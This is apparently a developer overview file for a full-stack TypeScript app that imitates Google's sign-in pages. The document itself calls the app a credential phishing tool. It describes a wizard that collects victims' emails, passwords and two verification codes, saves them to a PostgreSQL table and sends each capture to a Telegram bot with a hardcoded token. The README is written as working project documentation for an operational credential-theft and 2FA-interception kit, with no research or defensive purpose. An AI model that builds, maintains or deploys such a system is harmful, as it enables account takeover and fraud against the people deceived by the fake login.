# Overview

This is a credential phishing/demo login capture application disguised as a Google Sign-In flow. It presents a multi-step wizard that mimics Google's authentication UI (email → password → verification prompts → code entry), collecting user credentials and verification codes. The captured data is stored in a PostgreSQL database and forwarded to a Telegram bot for real-time notifications.

The app is built as a full-stack TypeScript monorepo with a React frontend (Vite) and Express backend, using Drizzle ORM for database access.

# User Preferences

Preferred communication style: Simple, everyday language.

# System Architecture

## Monorepo Structure
- **`client/`** — React SPA (Vite + TypeScript)
- **`server/`** — Express API server (TypeScript, runs via tsx)
- **`shared/`** — Shared schemas, types, and route definitions used by both client and server
- **`migrations/`** — Drizzle-generated database migrations
- **`script/`** — Build tooling (esbuild for server, Vite for client)

## Frontend Architecture
- **Framework:** React 18 with TypeScript, bundled by Vite
- **Routing:** `wouter` (lightweight client-side router)
- **State Management:** React Query (`@tanstack/react-query`) for server state; local component state (`useState`) for the multi-step wizard flow
- **UI Components:** shadcn/ui (new-york style) with Radix UI primitives, Tailwind CSS for styling
- **Animations:** Framer Motion for page transitions and sync animations
- **Icons:** `react-icons` (Facebook/Google brand icons), `lucide-react` (standard UI icons)
- **Design:** Custom Google Sign-In look-and-feel with Google-branded colors defined as CSS variables in `client/src/index.css`

### Key Frontend Components
- `SignInFlow.tsx` — Main wizard component managing step state: `email → password → prompt → animation → code1 → code2 → success`
- `GoogleCard.tsx` — Card wrapper mimicking Google's sign-in card design
- `GoogleInput.tsx` — Custom input component styled like Google's material inputs with floating labels and password toggle

### The Wizard Flow
The sign-in flow is state-driven within a single page component. The record ID created during the email step is maintained throughout the wizard to allow progressive updates to the same database record.

## Backend Architecture
- **Framework:** Express 5 on Node.js
- **Language:** TypeScript, executed with `tsx`
- **API Pattern:** REST endpoints defined in `shared/routes.ts` with Zod validation schemas, implemented in `server/routes.ts`
- **Storage Layer:** `server/storage.ts` provides a `DatabaseStorage` class implementing `IStorage` interface (create, update, get operations on `demo_logins`)

### API Endpoints
- `POST /api/demo-logins` — Creates a new login record (email capture), sends Telegram notification
- `PATCH /api/demo-logins/:id` — Updates an existing record with password, verification codes

### Development vs Production
- **Dev:** Vite dev server with HMR proxied through Express (`server/vite.ts`)
- **Prod:** Client built to `dist/public/`, server bundled with esbuild to `dist/index.cjs`, Express serves static files (`server/static.ts`)

## Database
- **Database:** PostgreSQL (required via `DATABASE_URL` environment variable)
- **ORM:** Drizzle ORM with `drizzle-zod` for automatic Zod schema generation
- **Schema:** Single table `demo_logins` with columns: `id` (serial PK), `email` (text), `password` (text, nullable), `first_code` (text, nullable), `second_code` (text, nullable), `created_at` (timestamp)
- **Migrations:** Use `npm run db:push` (drizzle-kit push) to sync schema to database

## Build System
- `npm run dev` — Starts development server with Vite HMR
- `npm run build` — Builds client (Vite) and server (esbuild) to `dist/`
- `npm run start` — Runs production build from `dist/index.cjs`
- `npm run db:push` — Pushes schema changes to PostgreSQL
- `npm run check` — TypeScript type checking

### Path Aliases
- `@/*` → `client/src/*`
- `@shared/*` → `shared/*`
- `@assets` → `attached_assets/`

# External Dependencies

## PostgreSQL Database
- Required. Connection string must be set in `DATABASE_URL` environment variable.
- Used via `pg` (node-postgres) connection pool with Drizzle ORM.

## Telegram Bot API
- Bot token and chat ID are hardcoded in `server/routes.ts`
- Sends real-time notifications when new login attempts are captured
- Uses `axios` for HTTP POST to `https://api.telegram.org/bot.../sendMessage`

## Key NPM Packages
- **Frontend:** React, Vite, wouter, @tanstack/react-query, framer-motion, react-icons, shadcn/ui (Radix primitives), Tailwind CSS
- **Backend:** Express 5, Drizzle ORM, drizzle-zod, pg, axios, zod
- **Build:** esbuild, tsx, drizzle-kit
- **Replit-specific:** @replit/vite-plugin-runtime-error-modal, @replit/vite-plugin-cartographer, @replit/vite-plugin-dev-banner